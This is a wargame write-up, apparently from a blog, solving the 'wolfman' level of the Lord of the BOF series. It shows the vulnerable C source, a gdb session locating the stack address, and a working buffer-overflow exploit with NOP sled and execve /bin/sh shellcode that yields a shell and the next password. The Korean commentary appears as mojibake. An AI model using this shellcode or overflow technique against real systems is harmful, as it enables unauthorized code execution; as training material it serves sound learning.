I"­ <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login: orc
Password:
<span class="o">[</span>orc@localhost orc]<span class="nv">$ </span><span class="nb">ls
</span>wolfman  wolfman.c
<span class="o">[</span>orc@localhost orc]<span class="nv">$ </span><span class="nb">cat </span>wolfman.c
/<span class="k">*</span>
        The Lord of the BOF : The Fellowship of the BOF
        - wolfman
        - egghunter + buffer hunter
<span class="k">*</span>/

<span class="c">#include &lt;stdio.h&gt;</span>
<span class="c">#include &lt;stdlib.h&gt;</span>

extern char <span class="k">**</span>environ<span class="p">;</span>

main<span class="o">(</span>int argc, char <span class="k">*</span>argv[]<span class="o">)</span>
<span class="o">{</span>
        char buffer[40]<span class="p">;</span>
        int i<span class="p">;</span>

        <span class="k">if</span><span class="o">(</span>argc &lt; 2<span class="o">){</span>
                <span class="nb">printf</span><span class="o">(</span><span class="s2">"argv error</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
                <span class="nb">exit</span><span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
        <span class="o">}</span>

        // egghunter
        <span class="k">for</span><span class="o">(</span><span class="nv">i</span><span class="o">=</span>0<span class="p">;</span> environ[i]<span class="p">;</span> i++<span class="o">)</span>
                memset<span class="o">(</span>environ[i], 0, strlen<span class="o">(</span>environ[i]<span class="o">))</span><span class="p">;</span>

        <span class="k">if</span><span class="o">(</span>argv[1][47] <span class="o">!=</span> <span class="s1">'\xbf'</span><span class="o">)</span>
        <span class="o">{</span>
                <span class="nb">printf</span><span class="o">(</span><span class="s2">"stack is still your friend.</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
                <span class="nb">exit</span><span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
        <span class="o">}</span>
        strcpy<span class="o">(</span>buffer, argv[1]<span class="o">)</span><span class="p">;</span>
        <span class="nb">printf</span><span class="o">(</span><span class="s2">"%s</span><span class="se">\n</span><span class="s2">"</span>, buffer<span class="o">)</span><span class="p">;</span>

        // buffer hunter
        memset<span class="o">(</span>buffer, 0, 40<span class="o">)</span><span class="p">;</span>
<span class="o">}</span>
</code></pre></div></div>
<p>ì „ì˜ orc ë¬¸ì œì™€ ê±°ì˜ ë¹„ìŠ·í•˜ë‹¤.</p>

<p>ë‹¤ë¥¸ ì ì´ ìˆë‹¤ë©´ ê°€ì¥ ë°‘ì— memsetì´ë¼ëŠ” í•¨ìˆ˜ë¥¼ ì‚¬ìš©í–ˆë‹¤ëŠ” ê²ƒì´ë‹¤.</p>

<p>memset(ë°°ì—´ ì´ë¦„, ì±„ìš¸ ê°’, ë ì¸ë±ìŠ¤) í˜•ì‹ìœ¼ë¡œ ì‚¬ìš©ë˜ëŠ” í•¨ìˆ˜ì´ë‹¤.</p>

<p>ì‹œì‘ë¶€í„° ëê¹Œì§€ ëª¨ë‘ ì±„ìš¸ ê°’ìœ¼ë¡œ ë°°ì—´ì„ ì´ˆê¸°í™”í•œë‹¤.</p>

<p>ì´ê²ƒì€ ë°°ì—´ ì•ˆì— ì‰˜ ì½”ë“œë¥¼ ë„£ì„ ìˆ˜ ì—†ë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•œë‹¤.</p>

<p>ê·¸ë˜ì„œ ì´ë²ˆì— ì‚¬ìš©í•  ë°©ë²•ì€, RETì£¼ì†Œ ë’¤ì— ì‰˜ ì½”ë“œë¥¼ ë„£ëŠ” ê²ƒì´ë‹¤.</p>

<p>nop+RET+nop+ì‰˜ ì½”ë“œì˜ í˜•ì‹ìœ¼ë¡œ ë„£ìœ¼ë©´ ë°°ì—´ì´ ì´ˆê¸°í™”ê°€ ëœë‹¤ê³  í•´ë„ ì‰˜ ì½”ë“œëŠ” ë‚¨ëŠ” ê²ƒì´ë‹¤.</p>

<p>ê·¸ëŸ¬ë©´ ì£¼ì†Œë¥¼ êµ¬í•´ë³´ì.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>orc@localhost orc]<span class="nv">$ </span><span class="nb">mkdir </span>tmp
<span class="o">[</span>orc@localhost orc]<span class="nv">$ </span><span class="nb">cp </span>wolfman tmp/
<span class="o">[</span>orc@localhost orc]<span class="nv">$ </span><span class="nb">cd </span>tmp
</code></pre></div></div>
<p>gdbë¥¼ ì‚¬ìš©í•˜ì.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>orc@localhost tmp]<span class="nv">$ </span>gdb <span class="nt">-q</span> wolfman
<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>disassembly-flavor intel
<span class="o">(</span>gdb<span class="o">)</span> disas main
Dump of assembler code <span class="k">for function </span>main:
0x8048500 &lt;main&gt;:       push   %ebp
0x8048501 &lt;main+1&gt;:     mov    %ebp,%esp
0x8048503 &lt;main+3&gt;:     sub    %esp,44
...
0x80485b8 &lt;main+184&gt;:   push   %edx
0x80485b9 &lt;main+185&gt;:   lea    %eax,[%ebp-40]
0x80485bc &lt;main+188&gt;:   push   %eax
0x80485bd &lt;main+189&gt;:   call   0x8048440 &lt;strcpy&gt;
0x80485c2 &lt;main+194&gt;:   add    %esp,8

</code></pre></div></div>
<p>ma+189ì—ì„œ strcpyê°€ ë˜ë¯€ë¡œ ê·¸ ì•„ë˜, main+194ì— breakë¥¼ ê±¸ì.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> b<span class="k">*</span>main+194
Breakpoint 1 at 0x80485c2
<span class="o">(</span>gdb<span class="o">)</span> r <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"\xbf"*48+"A"*100'</span><span class="si">)</span>
Starting program: /home/orc/tmp/wolfman <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"\xbf"*48+"A"*100'</span><span class="si">)</span>

Breakpoint 1, 0x80485c2 <span class="k">in </span>main <span class="o">()</span>
</code></pre></div></div>
<p>ë’¤ì˜ AëŠ” ë„£ì„ ì‰˜ ì½”ë“œë¼ê³  ìƒê°í•˜ì.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> x/300x <span class="nv">$esp</span>
0xbffffa54:     0xbffffa60      0xbffffbe1      0x00000016      0xbfbfbfbf
0xbffffa64:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
0xbffffa74:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
0xbffffa84:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0x41414141
...
0xbffffbe4:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
0xbffffbf4:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf
0xbffffc04:     0xbfbfbfbf      0xbfbfbfbf      0xbfbfbfbf      0x414141bf
0xbffffc14:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc24:     0x41414141      0x41414141      0x41414141      0x41414141
</code></pre></div></div>
<p>bffffc04ì—ì„œ Aê°€ ë³´ì´ë¯€ë¡œ ì´ê³³ì„ RET ì£¼ì†Œë¡œ ì“°ì.</p>

<p>ì½”ë“œëŠ” nop+44+RET+nop*100(ì˜ë¯¸ëŠ” ì—†ê³  ê·¸ëƒ¥ ì ë‹¹íˆ)+ì‰˜ ì½”ë“œë¡œ í•˜ì.</p>

<p>ì‚¬ìš©í•  24byte ì‰˜ ì½”ë“œ</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\x</span>90<span class="s2">"*100+"</span><span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>50<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>50<span class="se">\x</span>53<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>99<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>orc@localhost orc]<span class="nv">$ </span>./wolfman <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"\x90"*44+"\x04\xfc\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'</span><span class="si">)</span>
ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±?í“§ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±ë¦±?í”h//shh/binë¥PSë£ì†»
        ?
bash<span class="nv">$ </span>my-pass
euid <span class="o">=</span> 505
love eyuna
</code></pre></div></div>
<p>ì„±ê³µì´ë‹¤.</p>

<p>orcâ€™s password : â€œlove eyunaâ€</p>
:ET